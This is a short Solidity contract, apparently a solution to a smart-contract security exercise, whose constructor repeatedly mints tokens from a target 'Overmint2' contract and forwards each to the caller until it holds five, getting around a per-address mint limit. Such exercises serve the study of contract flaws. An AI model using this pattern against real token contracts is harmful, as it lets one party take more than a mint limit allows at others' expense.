// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint2.sol";

contract Overmint2Attacker {
    constructor(Overmint2 _victim) {
        while (_victim.balanceOf(msg.sender) < 5) {
            _victim.mint();
            _victim.transferFrom(address(this), msg.sender, _victim.totalSupply());
        }
    }
}
